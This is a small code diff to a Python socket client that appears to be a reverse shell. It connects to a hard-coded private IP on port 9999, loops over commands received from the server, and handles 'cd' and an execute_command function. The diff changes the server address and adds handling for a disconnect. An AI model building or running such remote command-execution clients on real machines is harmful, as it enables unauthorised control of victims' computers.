@@ -17,7 +17,7 @@ def execute_command(command):
 s = socket.socket()
 
 # Server IP and port
-host = '192.168.8.102'
+host = '192.168.56.1'
 port = 9999
 
 # Connect to the server
@@ -26,6 +26,10 @@ s.connect((host, port))
 while True:
     # Receive data from the server
     data = s.recv(1024).decode("utf-8")
+
+    if not data:
+        print("Server disconnected.")
+        break
 
     if len(data) > 0:
         if data[:2] == 'cd':
